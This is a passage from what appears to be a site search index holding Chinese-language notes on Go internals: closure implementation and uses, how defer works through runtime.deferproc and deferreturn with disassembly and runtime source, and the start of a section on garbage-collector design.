<p>DX\u5bc4\u5b58\u5668\u662f\u6574\u4e2a\u95ed\u5305\u5b9e\u73b0\u7684\u6838\u5fc3\uff0c\u56e0\u4e3a\u7ed3\u6784\u4f53\u662f\u5728\u5806\u4e0a\u8fd0\u884c\u671f\u52a8\u6001\u5206\u914d\u7684\uff0c\u5b83\u7684\u5730\u5740\u5728\u7f16\u8bd1\u671f\u4e0d\u77e5\u9053\uff0c\u95ed\u5305\u4e2d\u7684\u51fd\u6570\u4e5f\u662f\u7f16\u8bd1\u671f\u5c31\u88ab\u7f16\u8bd1\u4e3a\u6307\u4ee4\u7684\uff0c\u90a3\u4e48\u51fd\u6570\u6267\u884c\u65f6\u5982\u4f55\u77e5\u9053\u5b83\u7684\u672c\u5730\u53d8\u91cf\u7684\u5185\u5b58\u5730\u5740\u5c31\u662f\u95ee\u9898\u3002DX\u5bc4\u5b58\u5668\u662f\u4e00\u4e2a\u540d\u5b57\uff0c\u7f16\u8bd1\u671f\u3001\u8fd0\u884c\u671f\u90fd\u4e00\u6837\uff0cGo\u628a\u52a8\u6001\u7684\u5730\u5740\u5199\u8fdb\u53bb\uff0c\u901a\u8fc7\u8fd9\u4e2a\u9759\u6001\u7684\u540d\u5b57\u52a0\u4e0a\u504f\u79fb\u91cf\u6765\u4ea4\u4e92\u5b9e\u73b0\u95ed\u5305\u3002</p>"},{"location":"go/closure/#_4","title":"\u5e94\u7528\u573a\u666f","text":""},{"location":"go/closure/#_5","title":"\u8ba1\u6570\u5668","text":"<p>\u6bcf\u6b21\u8c03\u7528\u8fd4\u56de\u4e00\u4e2a\u81ea\u589e\u7684\u503c\uff0c\u4ee5\u524d\u53ef\u80fd\u901a\u8fc7\u7c7b\u6216\u8005\u5168\u5c40\u53d8\u91cf\uff0c\u7528\u51fd\u6570\u5b9e\u73b0\u4f1a\u6bd4\u8f83\u9ebb\u70e6\uff0c\u6709\u4e86\u95ed\u5305\u4f1a\u6bd4\u8f83\u7b80\u5355: <pre><code>func getCounter() func() int {\n    x := 0\n    return func() int {\n        x++\n        return x\n    }\n}\n\nfunc main() {\n    c := getCounter()\n    println(c())\n    println(c())\n    println(c())\n}\n</code></pre> \u6709\u70b9\u7c7b\u4f3c\u4e8eC\u8bed\u8a00\u4e2d\u7684\u9759\u6001\u5c40\u90e8\u53d8\u91cf\uff0c\u53ef\u4ee5\u628a\u6570\u636e\u7ed1\u5b9a\u5230\u51fd\u6570\u8eab\u4e0a\uff0c\u4e5f\u5c31\u6709\u70b9\u50cf\u7c7b\u4e86\u3002</p>"},{"location":"go/closure/#_6","title":"\u5c01\u95ed\u533a\u95f4","text":"<p>\u4e5f\u53ef\u4ee5\u628a\u4e00\u4efd\u6570\u636e\u7ed1\u5b9a\u5230\u591a\u4e2a\u51fd\u6570\u4e2d\u53bb\uff0c\u5982\u4e0b\u4f8b: <pre><code>func test() (func(), func(), func()) {\n    x := 100\n    fmt.Printf(\"%v\\n\", &amp;x)\n    return func() {\n            fmt.Printf(\"f1.x:%v\\n\", &amp;x)\n        }, func() {\n            fmt.Printf(\"f2.x:%v\\n\", &amp;x)\n        }, func() {\n            fmt.Printf(\"f3.x:%v\\n\", &amp;x)\n        }\n}\nfunc main() {\n    f1, f2, f3 := test()\n    f1()\n    f2()\n    f3()\n}\n</code></pre> x\u50cf\u662f\u628a\u5168\u5c40\u53d8\u91cf\u7684\u4f5c\u7528\u57df\u7f29\u5c0f\u5230test\u51fd\u6570\u4e2d\uff0c\u4f7f\u5f97\u91cc\u9762\u7684\u4e09\u4e2a\u4e0d\u540c\u903b\u8f91\u5171\u4eab\u5b83\uff0c\u6784\u6210\u4e86\u4e00\u4e2a\u76f8\u5bf9\u5c01\u95ed\u7684\u533a\u95f4\u3002</p>"},{"location":"go/closure/#_7","title":"\u7ed1\u5b9a\u6570\u636e\u548c\u903b\u8f91","text":"<p>\u6709\u65f6\u5019\u9700\u8981A\u628a\u65b9\u6cd5\u548c\u4e0d\u540c\u6570\u636e\u90fd\u4f20\u7ed9B\uff0c\u76f4\u63a5\u4f20\u770b\u4e0a\u53bb\u4e0d\u4f18\u96c5\uff0c\u628a\u5b83\u4eec\u6253\u5305\u4e3a\u4e00\u4e2a\u95ed\u5305\u770b\u4e0a\u53bb\u5c31\u50cf\u53ea\u4f20\u4e86\u4e00\u4e2a\u65b9\u6cd5\uff0cB\u53ea\u662f\u63a5\u6536\u4e00\u5957\u903b\u8f91\uff0c\u8fd9\u4e2a\u903b\u8f91\u5177\u4f53\u662f\u600e\u4e48\u8fd0\u884cB\u4e0d\u9700\u8981\u77e5\u9053\u3002 <pre><code>func hello(db Database) func(http.ResponseWriter, *http.Request) {\n    return func(w http.ResponseWriter, r *http.Request) {\n        fmt.Fprintln(w, db.Url)\n    }\n}\nfunc main() {\n    db := NewDatabase(\"localhost:5432\")\n    http.HandleFunc(\"/hello\", hello(db))\n    http.ListenAndServe(\":3000\", nil)\n}\n</code></pre></p>"},{"location":"go/closure/#_8","title":"\u6539\u53d8\u51fd\u6570\u7b7e\u540d","text":"<p>\u4f8b\u5982\u628a\u4e00\u4e2a\u51fd\u6570\u53d8\u6210\u504f\u51fd\u6570(partial) <pre><code>func test(x int) {\n    println(x)\n}\n\nfunc partial(f func(int), x int) func() {\n    return func() {\n        f(x)\n    }\n}\n\nfunc main() {\n    f := partial(test, 100)\n    f()\n}\n</code></pre></p>"},{"location":"go/closure/#_9","title":"\u603b\u7ed3","text":"<p>\u95ed\u5305\u867d\u7136\u6539\u5584\u4e86\u4e00\u4e9b\u4ee3\u7801\u4e0a\u7684\u8bbe\u8ba1\uff0c\u8ba9\u4ee3\u7801\u770b\u4e0a\u53bb\u66f4\u5e72\u51c0\u6574\u6d01\uff0c\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u8bbe\u8ba1\u6a21\u5f0f\u3002\u4f46\u5b83\u5ef6\u957f\u4e86\u53d8\u91cf\u7684\u751f\u547d\u5468\u671f\uff0c\u5fc5\u7136\u4f1a\u5bfc\u81f4\u9003\u9038\u884c\u4e3a\uff0c\u5176\u5185\u90e8\u7684\u4e00\u4e9b\u4ea4\u4e92\u8fc7\u7a0b\u4e5f\u4f1a\u4f7f\u6267\u884c\u6027\u80fd\u964d\u4f4e\u3002\u6240\u4ee5\u5bf9\u4e8e\u95ed\u5305\u4e5f\u4e0d\u80fd\u6ee5\u7528\u3002</p>"},{"location":"go/defer/","title":"Defer\u5ef6\u8fdf\u8c03\u7528","text":"<p>defer\u662fGO\u8bed\u8a00\u4e2d\u72ec\u6709\u7684\u7279\u6027\uff0c\u5728\u5176\u4ed6\u8bed\u8a00\u4e2d\u53ef\u80fd\u91c7\u7528<code>try...finally</code>\u8fd9\u6837\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\uff0c\u4e24\u8005\u8fd8\u662f\u6709\u5f88\u5927\u533a\u522b\u7684\u3002finally\u662f\u7acb\u5373\u6267\u884c\u7684\uff0c\u800cdefer\u4f1a\u5ef6\u8fdf\u6267\u884c\uff0c\u4e14defer\u53ef\u4ee5\u5206\u5272\u5f88\u591a\u7684\u903b\u8f91\u3002\u5ef6\u8fdf\u8c03\u7528\u6700\u5927\u7684\u4f18\u52bf\u662f\u5373\u4fbf\u51fd\u6570\u6267\u884c\u51fa\u9519\uff0c\u4f9d\u7136\u80fd\u4fdd\u8bc1\u56de\u6536\u8d44\u6e90\u7b49\u64cd\u4f5c\u5f97\u4ee5\u6267\u884c\u3002</p> <p>\u6211\u4eec\u770b\u5230\u5f88\u591a\u7684\u6587\u7ae0\u4e2d\u662f\u8fd9\u6837\u63cf\u8ff0defer\u6267\u884c\u65b9\u5f0f\u7684\uff0c\u53c2\u6570\u9996\u5148\u4f1a\u88ab\u590d\u5236\u8fdb<code>defer func</code>\u4e2d\uff0c\u7136\u540e\u6267\u884c\u539f\u51fd\u6570\uff0c\u7136\u540e\u6267\u884c<code>defer func</code>\uff0c\u6700\u540e\u518d\u6267\u884creturn\u3002\u90a3\u4e48\u771f\u7684\u662f\u8fd9\u6837\u4e48\uff1f\u8fd9\u4f3c\u4e4e\u89e3\u91ca\u4e0d\u4e86\u5982\u4e0b\u793a\u4f8b: test.go<pre><code>func test1() int {\n    x := 100\n    defer func() {\n        x++\n    }()\n    return x\n}\n\nfunc test2() (x int) {\n    x = 100\n    defer func() {\n        x++\n    }()\n    return 100\n}\n\nfunc main() {\n    println(\"test1:\", test1())\n    println(\"test2:\", test2())\n}\n</code></pre> <pre><code>[ubuntu] ~/.mac $ go run test.go\ntest1: 100\ntest2: 101\n</code></pre></p> <p>\u6309\u7167\u8fd9\u4e2a\u89c2\u70b9\uff0c\u4f3c\u4e4etest1()\u7684\u6267\u884c\u8fc7\u7a0b\u5e94\u8be5\u662fx\u7b49\u4e8e100\uff0c\u7136\u540ex++\uff0c\u7136\u540e\u8fd4\u56dex=101\uff1btest2()\u5e94\u8be5\u662fx\u7b49\u4e8e100\uff0c\u7136\u540ex++\uff0c\u7136\u540e\u8fd4\u56de100\u3002\u4f46\u6267\u884c\u7ed3\u679c\u5374\u90fd\u548c\u6211\u4eec\u9884\u60f3\u7684\u4e0d\u4e00\u6837\uff0c\u5e26\u7740\u8fd9\u6837\u7684\u7591\u95ee\uff0c\u6211\u4eec\u6765\u6df1\u5165\u4e86\u89e3defer\u7684\u6267\u884c\u673a\u5236\u3002</p> <p>\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50: <pre><code>func test(a, b int) {\n    println(\"test: \", a, b)\n}\nfunc main() {\n    a, b := 0x11, 0x22\n    defer test(a, b)\n    a++\n    b++\n    println(\"main: \", a, b)\n}\n</code></pre></p> <p>\u7136\u540e\u53cd\u6c47\u7f16\u770b\u770b\u5b83\u7684\u6267\u884c\u8fc7\u7a0b: <pre><code>[ubuntu] ~/.mac $ go build test.go\n[ubuntu] ~/.mac $ go tool objdump -s \"main\\.main\" test\nTEXT main.main(SB) /root/.mac/test.go\n  test.go:6     0x4523b0        64488b0c25f8ffffff  MOVQ FS:0xfffffff8, CX\n  test.go:6     0x4523b9        483b6110        CMPQ 0x10(CX), SP\n  test.go:6     0x4523bd        0f86ad000000        JBE 0x452470\n  test.go:6     0x4523c3        4883ec58        SUBQ $0x58, SP\n  test.go:6     0x4523c7        48896c2450      MOVQ BP, 0x50(SP)\n  test.go:6     0x4523cc        488d6c2450      LEAQ 0x50(SP), BP\n  test.go:8     0x4523d1        c744241010000000    MOVL $0x10, 0x10(SP)\n  test.go:8     0x4523d9        488d05705a0200      LEAQ 0x25a70(IP), AX\n  test.go:8     0x4523e0        4889442428      MOVQ AX, 0x28(SP)\n  test.go:8     0x4523e5        48c744244011000000  MOVQ $0x11, 0x40(SP)\n  test.go:8     0x4523ee        48c744244822000000  MOVQ $0x22, 0x48(SP)\n  test.go:8     0x4523f7        488d442410      LEAQ 0x10(SP), AX\n  test.go:8     0x4523fc        48890424        MOVQ AX, 0(SP)\n  test.go:8     0x452400        e87b16fdff      CALL runtime.deferprocStack(SB)\n  test.go:8     0x452405        85c0            TESTL AX, AX\n  test.go:8     0x452407        7557            JNE 0x452460\n  test.go:11        0x452409        e8a230fdff      CALL runtime.printlock(SB)\n  test.go:11        0x45240e        488d0583130200      LEAQ 0x21383(IP), AX\n  test.go:11        0x452415        48890424        MOVQ AX, 0(SP)\n  test.go:11        0x452419        48c744240807000000  MOVQ $0x7, 0x8(SP)\n  test.go:11        0x452422        e8c939fdff      CALL runtime.printstring(SB)\n  test.go:11        0x452427        48c7042412000000    MOVQ $0x12, 0(SP)\n  test.go:11        0x45242f        e8fc37fdff      CALL runtime.printint(SB)\n  test.go:11        0x452434        e8b732fdff      CALL runtime.printsp(SB)\n  test.go:11        0x452439        48c7042423000000    MOVQ $0x23, 0(SP)\n  test.go:11        0x452441        e8ea37fdff      CALL runtime.printint(SB)\n  test.go:11        0x452446        e8f532fdff      CALL runtime.printnl(SB)\n  test.go:11        0x45244b        e8e030fdff      CALL runtime.printunlock(SB)\n  test.go:12        0x452450        90          NOPL\n  test.go:12        0x452451        e82a1cfdff      CALL runtime.deferreturn(SB)\n  test.go:12        0x452456        488b6c2450      MOVQ 0x50(SP), BP\n  test.go:12        0x45245b        4883c458        ADDQ $0x58, SP\n  test.go:12        0x45245f        c3          RET\n  test.go:8     0x452460        90          NOPL\n  test.go:8     0x452461        e81a1cfdff      CALL runtime.deferreturn(SB)\n  test.go:8     0x452466        488b6c2450      MOVQ 0x50(SP), BP\n  test.go:8     0x45246b        4883c458        ADDQ $0x58, SP\n  test.go:8     0x45246f        c3          RET\n  test.go:6     0x452470        e82b7affff      CALL runtime.morestack_noctxt(SB)\n  test.go:6     0x452475        e936ffffff      JMP main.main(SB)\n</code></pre></p> <p>\u6211\u4eec\u53d1\u73b0<code>defer test(a, b)</code>\u5b9e\u9645\u4e0a\u4f1a\u88ab\u8f6c\u5316\u4e3a<code>CALL runtime.deferproc(SB)</code>(Go1.13\u624d\u4f7f\u7528deferprocStack\uff0c\u8fd9\u91cc\u5148\u4ee5deferproc\u4e3a\u4f8b)\uff0c\u4e4b\u540e\u8fdb\u884c\u7684<code>a++</code>\u5df2\u7ecf\u4e0d\u4f1a\u5f71\u54cd\u5230\u5b83\uff0c\u800c\u5728main\u51fd\u6570\u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u624d\u4f1a\u53bb\u901a\u8fc7<code>CALL runtime.deferreturn(SB)</code>\u8c03\u7528\u5b83\u3002</p> <p>\u6211\u4eec\u518d\u6765\u770b\u770b<code>runtime.deferproc</code>\u5e72\u4e86\u4e9b\u4ec0\u4e48\uff0c\u6211\u5728\u8fd9\u91cc\u4e5f\u628a\u6e90\u7801\u4e2d\u91cd\u8981\u7684\u6ce8\u91ca\u7ffb\u8bd1\u4e86\u8fc7\u6765: go/src/runtime/panic.go<pre><code>// siz\u8868\u793afn\u65b9\u6cd5\u4e2d\u53c2\u6570\u9700\u8981\u5360\u7528\u591a\u5c11\u4e2a\u5b57\u8282\uff0c\u4f7f\u7528siz\u521b\u5efa\u4e86\u4e00\u4e2adeferred\u7684\u65b9\u6cd5fn\n// \u7f16\u8bd1\u5668\u5c06\u4e00\u4e2adefer\u8bed\u53e5\u8f6c\u5316\u4e3a\u4e00\u4e2a\u5bf9\u6b64\u65b9\u6cd5\u7684\u8c03\u7528\nfunc deferproc(siz int32, fn *funcval) {  // fn\u4e4b\u540e\u7d27\u8ddf\u7740fn\u7684\u53c2\u6570\n    if getg().m.curg != getg() {\n        throw(\"defer on system stack\")\n    }\n\n  //fn\u7684\u53c2\u6570\u5904\u4e8e\u4e00\u4e2a\u5371\u9669\u7684\u72b6\u6001\uff0cdeferproc\u7684stack map\u5e76\u6ca1\u6709\u590d\u5236\u5b83\u4eec\u3002\u6240\u4ee5\u6211\u4eec\u4e0d\u80fd\u8ba9\u5783\u573e\u56de\u6536\u5668\u6216\u8005\u6808\u590d\u5236\u89e6\u53d1\uff0c\u76f4\u5230\u6211\u4eec\u628a\u8fd9\u4e9b\u53c2\u6570\u590d\u5236\u5230\u4e00\u4e2a\u5b89\u5168\u7684\u5730\u65b9\u3002\u4e0b\u9762\u7684\u5185\u5b58\u590d\u5236\u4f1a\u505a\u5230\u8fd9\u4e00\u70b9\u3002\u5728\u590d\u5236\u5b8c\u6210\u524d\uff0c\u6211\u4eec\u53ea\u80fd\u8c03\u7528nosplit routines\u3002\n    sp := getcallersp()\n    argp := uintptr(unsafe.Pointer(&amp;fn)) + unsafe.Sizeof(fn)\n    callerpc := getcallerpc()\n\n    d := newdefer(siz)\n    if d._panic != nil {\n        throw(\"deferproc: d.panic != nil after newdefer\")\n    }\n    d.fn = fn\n    d.pc = callerpc\n    d.sp = sp\n    switch siz {\n    case 0:\n        // Do nothing.\n    case sys.PtrSize:\n        *(*uintptr)(deferArgs(d)) = *(*uintptr)(unsafe.Pointer(argp))\n    default:\n        memmove(deferArgs(d), unsafe.Pointer(argp), uintptr(siz))\n    }\n    return0()\n}\n</code></pre></p> <p>\u6211\u4eec\u53d1\u73b0newdefer\u51fd\u6570\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u8fd9\u6837\u7684\u7ed3\u6784\u4f53: go/src/runtime/runtime2.go<pre><code>type _defer struct {\n    siz     int32 // includes both arguments and results\n    started bool\n    heap    bool\n    openDefer bool\n    sp        uintptr  // sp at time of defer\n    pc        uintptr  // pc at time of defer\n    fn        *funcval // can be nil for open-coded defers\n    _panic    *_panic  // panic that is running defer\n    link      *_defer\n\n    fd   unsafe.Pointer // funcdata for the function associated with the frame\n    varp uintptr        // value of varp for the stack frame\n\n    framepc uintptr\n}\n</code></pre></p> <p>\u9274\u4e8e\u7bc7\u5e45\uff0c\u6211\u5220\u9664\u4e86\u5176\u6ce8\u91ca\uff0c\u4f46\u53ef\u6839\u636e\u8fd9\u4e9b\u6ce8\u91ca\u5f97\u51fa\u7ed3\u8bba\uff0c<code>defer func()</code>\u8fd9\u4e2a\u8bed\u53e5\u4f1a\u88ab\u4fdd\u5b58\u5728\u5f53\u524dGoroutine\u4e2d\uff0c\u628a\u5b83\u7684\u53c2\u6570\u3001\u6240\u9700\u8981\u7684\u6808\u5927\u5c0f\u7b49\u4fdd\u5b58\u4e3a\u4e00\u4e2a_defer\u5bf9\u8c61\uff0c\u628a\u591a\u4e2a_defer\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2aFILO\u7684\u961f\u5217\u3002</p> <p>\u4f46\u662fGoroutine\u548c\u51fd\u6570\u6267\u884c\u6ca1\u4ec0\u4e48\u76f4\u63a5\u7684\u5173\u7cfb\uff0c\u5982\u679c\u662fA\u5d4c\u5957B\uff0cB\u5d4c\u5957C\uff0cA\u3001B\u3001C\u90fd\u6709\u5404\u81ea\u7684defer\u8bed\u53e5\uff0c\u90a3\u4e48\u5b83\u4eec\u90fd\u4f1a\u88ab\u4fdd\u5b58\u5728\u8fd9\u4e2aGoroutine\u7684_defer\u94fe\u8868\u4e2d\uff0c\u5b83\u600e\u4e48\u4fdd\u8bc1\u6267\u884cC\u7684\u65f6\u5019\u4e0d\u628aB\u7684defer\u6267\u884c\u6389\uff0c\u8fd9\u4e2a\u79d8\u5bc6\u85cf\u5728<code>CALL runtime.deferreturn(SB)</code>\u4e2d:</p> <pre><code>func deferreturn(arg0 uintptr) {\n    gp := getg()\n    d := gp._defer\n    if d == nil {\n        return\n    }\n    sp := getcallersp()\n    if d.sp != sp {\n        return\n    }\n    if d.openDefer {\n        done := runOpenDeferFrame(gp, d)\n        if !done {\n            throw(\"unfinished open-coded defers in deferreturn\")\n        }\n        gp._defer = d.link\n        freedefer(d)\n        return\n    }\n\n    switch d.siz {\n    case 0:\n        // Do nothing.\n    case sys.PtrSize:\n        *(*uintptr)(unsafe.Pointer(&amp;arg0)) = *(*uintptr)(deferArgs(d))\n    default:\n        memmove(unsafe.Pointer(&amp;arg0), deferArgs(d), uintptr(d.siz))\n    }\n    fn := d.fn\n    d.fn = nil\n    gp._defer = d.link\n    freedefer(d)\n    jmpdefer(fn, uintptr(unsafe.Pointer(&amp;arg0)))\n}\n</code></pre> <p>\u51fd\u6570\u6267\u884c\u8c03\u7528\u8fd9\u4e2a\u6307\u4ee4\u7684\u65f6\u5019\uff0c\u5b83\u5148\u62ff\u5230\u5f53\u524dGoroutine\u7684_defer\u94fe\u8868\uff0c\u7136\u540e\u4f9d\u6b21\u68c0\u67e5\u5b83\u7684SP\u5c31\u884c\u4e86\uff0c\u8fd9\u4e2aSP\u662f\u6267\u884cdeferproc\u65f6\u5b58\u8fdb\u53bb\u7684\u5f53\u524d\u8fd9\u4e2a\u51fd\u6570\u7684\u6808\u9876\uff0c\u53ea\u8981\u4e0d\u4e00\u81f4\u90a3\u80af\u5b9a\u662f\u7236\u51fd\u6570\u7684\u6808\u4e86\u3002</p> <p>\u56de\u5230\u6700\u521d\u7684\u95ee\u9898\uff0c\u6211\u4eec\u53d1\u73b0\u53cd\u7f16\u8bd1\u4e4b\u540e\uff0c\u51fd\u6570\u7684\u6574\u4e2a\u6267\u884c\u987a\u5e8f\u662f\u8fd9\u6837\u7684\uff0c\u51fd\u6570\u8c03\u7528\u65b9\u5df2\u7ecf\u5206\u914d\u597d\u4e86\u88ab\u8c03\u7528\u65b9\u7684\u53c2\u6570\u548c\u8fd4\u56de\u503c\u76f8\u5bf9\u4e8e\u6808\u9876\u7684\u5730\u5740\uff0c\u7136\u540e\u6267\u884c\u51fd\u6570\uff0c\u9047\u5230defer\u8bed\u53e5\u65f6\u5148\u5b58\u5728Goroutine\u7684_defer\u94fe\u8868\u4e2d\u63a5\u7740\u6267\u884c\u51fd\u6570\uff0c\u6267\u884c\u5b8c\u51fd\u6570\u540e\u56de\u8fc7\u5934\u6765\u6267\u884c_defer\u7684func\uff0c\u6700\u540e\u8c03\u7528RET\u6307\u4ee4\u5e76\u6062\u590d\u73b0\u573a\u3002\u5957\u7528\u5230test1()\u4e2d\uff0c\u5c31\u662f\u5148\u5b9a\u4e49\u4e86\u8fd4\u56de\u503c(return_val)\u662f\u4e2a\u6574\u6570\u5e76\u7ed9\u5b83\u4e86\u4e2a\u5730\u5740\uff0c\u7136\u540e\u6267\u884cx:=100\uff0c\u7136\u540ereturn x\u88ab\u7ffb\u8bd1\u4e3a\u4e86return_val=x\uff0c\u7136\u540e\u6267\u884cx++\uff0c\u6700\u540e\u8c03\u7528RET\u6307\u4ee4\u3002\u5728test2()\u4e2d\uff0creturn_val\u76f4\u63a5\u53ebx\uff0c\u7136\u540e\u7ed9\u5b83\u8d4b\u503c100\uff0creturn 100\u5df2\u7ecf\u6ca1\u6709\u610f\u4e49\uff0c\u7136\u540e\u6267\u884creturn_val_x++\uff0c\u6700\u540e\u8c03\u7528RET\u6307\u4ee4\u3002</p> <p>\u6574\u4e2adefer\u7684\u6267\u884c\u6838\u5fc3\u8fc7\u7a0b\u5982\u4e0b\u56fe\u6240\u793a: </p> <p>\u6b64\u5916\uff0c\u6211\u4eec\u5728\u6316\u6398\u6e90\u7801\u7684\u65f6\u5019\u53d1\u73b0defer\u662f\u6709\u5f88\u591a\u5806\u4e0a\u5185\u5b58\u5206\u914d\u884c\u4e3a\u7684\uff0c\u8fd9\u4f1a\u5f71\u54cd\u6027\u80fd\u3002\u5728Go1.13\u4e2d\u7f16\u8bd1\u5668\u4f1a\u5224\u65ad\u5982\u679c\u6ca1\u6709\u53d1\u751f\u5185\u5b58\u9003\u9038\uff0c\u5c31\u8c03\u7528<code>deferprocStack</code>\u628a_defer\u5bf9\u8c61\u5efa\u5728\u6808\u4e0a\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u7684heap\u5c5e\u6027\u5c31\u662f\u63cf\u8ff0\u5b83\u662f\u5426\u5728\u5806\u4e0a\u5206\u914d\u7684\u3002\u5177\u4f53\u662f\u5982\u4f55\u5224\u65ad\u7684\uff0c\u521d\u6b65\u4e86\u89e3\u662fdefer func\u662f\u9876\u7ea7\u51fd\u6570\u65f6\u5c31\u5206\u914d\u5230\u6808\u4e0a\uff0c\u5982\u679c\u5b83\u5916\u5c42\u6709\u8fed\u4ee3\u5faa\u73af\u4e4b\u7c7b\u7684\u5c06\u4f1a\u88ab\u5206\u914d\u5230\u5806\u4e0a\uff0c\u4e4b\u540e\u518d\u8be6\u7ec6\u4e86\u89e3\u3002</p>"},{"location":"go/gc/","title":"\u5783\u573e\u56de\u6536\u5668\u7684\u8bbe\u8ba1","text":""},{"location":"go/gc/#_2","title":"\u80cc\u666f\u77e5\u8bc6","text":"<p>\u5783\u573e\u56de\u6536\u5668\u7684\u9996\u8981\u4efb\u52a1\u5c31\u662f\u8282\u7ea6\u5185\u5b58\uff0c\u5c3d\u53ef\u80fd\u7684\u8282\u7ea6\u5185\u5b58\u4e5f\u610f\u5473\u7740\u8981\u5c3d\u53ef\u80fd\u7684\u589e\u52a0\u6267\u884c\u9891\u7387\uff0c\u8fd9\u6837\u5c31\u4f1a\u5f71\u54cd\u6027\u80fd\u3002\u5982\u679c\u4e0d\u60f3\u5f71\u54cd\u7528\u6237\u4ee3\u7801\u7684\u6027\u80fd\uff0c\u5c31\u5f97\u5c3d\u91cf\u9694\u4e45\u4e00\u4e9b\u6267\u884c\u4e00\u6b21\u5783\u573e\u56de\u6536\uff0c\u8fd9\u5c31\u53ef\u80fd\u5bfc\u81f4\u5927\u91cf\u5185\u5b58\u65e0\u6cd5\u56de\u6536\uff0c\u7a7a\u95f4\u6d6a\u8d39\u4e25\u91cd\u3002\u6240\u4ee5\u5783\u573e\u56de\u6536\u5668\u7684\u8bbe\u8ba1\u96be\u70b9\u5c31\u662f\u5728\u8fd9\u4e24\u8005\u95f4\u53d6\u5f97\u5e73\u8861\uff0c\u5f88\u96be\u505a\u5230\u5b8c\u7f8e\u3002</p> <p>\u6211\u4eec\u8bf4\u5783\u573e\u56de\u6536\u901a\u5e38\u662f\u9488\u5bf9\u5806\u4e0a\u7684\u5783\u573e\uff0c\u5806\u5185\u5b58\u90fd\u662f\u8981\u91ca\u653e\u7684\uff0c\u533a\u522b\u53ea\u662f\u6709\u7684\u8bed\u8a00\u9700\u8981\u624b\u52a8\u91ca\u653e\uff0c\u6709\u7684\u8bed\u8a00\u7531\u5783\u573e\u56de\u6536\u5668\u6765\u91ca\u653e\uff0c\u4e0d\u91ca\u653e\u5c31\u662f\u5185\u5b58\u6cc4\u6f0f\u4e86\u3002\u800c\u6808\u5185\u5b58\u662f\u7ed1\u5b9a\u5728\u7ebf\u7a0b\u4e0a\uff0c\u5728Go\u4e2d\u4e5f\u5c31\u662fM(G0)\u4ee5\u53caG\uff0c\u9ed8\u8ba4\u76842KB\u4f1a\u5f53\u505a\u4e00\u4e2a\u5bf9\u8c61\u6765\u5904\u7406\uff0c\u5783\u573e\u56de\u6536\u5668\u901a\u5e38\u4e0d\u4f1a\u4ecb\u5165\u3002</p> <p>Go\u4e2d\u7684\u5783\u573e\u56de\u6536\u5c5e\u4e8e\u5f88\u4f20\u7edf\u7684\u7b56\u7565\uff0c\u57fa\u4e8e\u6807\u8bb0\u6e05\u7406\uff0c\u6807\u8bb0\u51fa\u6b7b\u4e86\u7684\u5bf9\u8c61\u7136\u540e\u6e05\u7406\u6389\uff0c\u4f46\u5b83\u4e0d\u4f1a\u538b\u7f29\u5185\u5b58\uff0c\u6709\u7684\u8bed\u8a00\u4f1a\u538b\u7f29\u597d\u5904\u5728\u4e8e\u53ef\u4ee5\u7a7a\u51fa\u5927\u91cf\u7684\u8fde\u7eed\u5185\u5b58\u7a7a\u95f4\uff0c\u4f46Go\u7531\u4e8e\u652f\u6301\u6307\u9488\u4e0d\u4f1a\u8fd9\u6837\u505a\u3002</p> <p>\u53e6\u5916\uff0c\u7531\u4e8eGo\u9700\u8981\u652f\u6301\u5783\u573e\u56de\u6536\u548c\u7528\u6237\u903b\u8f91\u7684\u5e76\u53d1\uff0c\u4e5f\u8ba9\u5783\u573e\u56de\u6536\u8fd9\u4ef6\u4e8b\u590d\u6742\u4e86\u5f88\u591a\u3002\u5c31\u50cf\u6211\u4eec\u8981\u6253\u626b\u4e00\u6761\u8857\uff0c\u90a3\u628a\u8857\u4e24\u5934\u5835\u4f4f\u6253\u626b\u5b8c\u4e86\u518d\u6253\u5f00\u662f\u6700\u65b9\u4fbf\u7684\uff0c\u4f46\u73b0\u5728\u8981\u5728\u6253\u626b\u7684\u540c\u65f6\u4e0d\u80fd\u5f71\u54cd\u6e38\u5ba2\u6e38\u89c8\uff0c\u8fd9\u5c31\u53ef\u80fd\u8fd9\u6761\u8857\u6c38\u8fdc\u6253\u626b\u4e0d\u5e72\u51c0\u3002</p> <p>\u5373\u4fbf\u662f\u5e76\u53d1\uff0c\u4e5f\u4f1a\u6709\u4e00\u4e2a\u77ed\u6682\u7684\u6682\u505c\u884c\u4e3a\uff0c\u88ab\u79f0\u4e3aSTW(stop the world)\u3002\u9700\u8981\u5728\u8fd9\u4e2a\u65f6\u95f4\u5185\u53bb\u901a\u77e5\u6240\u6709\u7684P\uff0c\u6211\u8981\u5f00\u59cb\u5783\u573e\u56de\u6536\u4e86\uff0c\u5e76\u505a\u4e00\u4e9b\u76f8\u5173\u7684\u72b6\u6001\u8bbe\u7f6e\uff0c\u7528\u6237\u4ee3\u7801\u88ab\u51bb\u7ed3\u3002\u6240\u4ee5\u6709\u65f6\u5019\u7528\u6237\u7a0b\u5e8f\u5bf9\u5783\u573e\u56de\u6536\u5668\u4e0d\u53cb\u597d\u662f\u53ef\u80fd\u9020\u6210\u5361\u987f\u7684\uff0c\u6bd4\u5982\u8bf4\u5728\u6781\u77ed\u7684\u65f6\u95f4\u5185\u5927\u91cf\u521b\u5efa\u4e86\u5fae\u5c0f\u5bf9\u8c61\uff0c\u903c\u7684\u5783\u573e\u56de\u6536\u5668\u6267\u884c\u9891\u7387\u5347\u9ad8\uff0c\u5361\u987f\u5c31\u4f1a\u660e\u663e\uff0c\u8fd9\u79cd\u60c5\u51b5\u5c31\u8981\u8003\u8651\u7528\u5bf9\u8c61\u6c60\u7b49\u65b9\u5f0f\u6765\u4f18\u5316\u3002</p> 